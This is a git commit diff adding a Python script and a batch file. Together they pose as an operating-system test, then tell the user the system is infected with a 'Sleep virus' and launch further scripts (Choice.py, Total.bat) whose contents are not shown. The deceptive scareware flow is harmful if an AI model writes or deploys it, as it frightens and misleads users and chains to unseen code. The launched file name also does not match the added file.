2ae79d473f3c0c8d5de9b0e1c6e6ff7e9b4eeb13
LanNetStat <117099688+LanNetStat@users.noreply.github.com>
2022-11-01 21:39:57 +0700

    Main files

---
+++ Main.py
@@ -0,0 +1,12 @@
+import time
+import os
+print("This is test of Operation System")
+print("Don't close this window!")
+print("Testing...")
+time.sleep(3)
+print("Begins....")
+print("by LanNetStat")
+print("Please wait for end test...")
+time.sleep(10)
+print("Your system has been infected with the Sleep virus. Although this is the beginning of the inevitable....")
+os.startfile("Scripting.cmd")
---
+++ Scripter.cmd
@@ -0,0 +1,10 @@
+@echo off
+cls
+title I am sorry
+echo I am very sorry... But you infected!
+@echo on
+cd Scripts
+start Choice.py
+echo You want to delete infectetion? Press any key...
+pause>nul
+start Total.bat
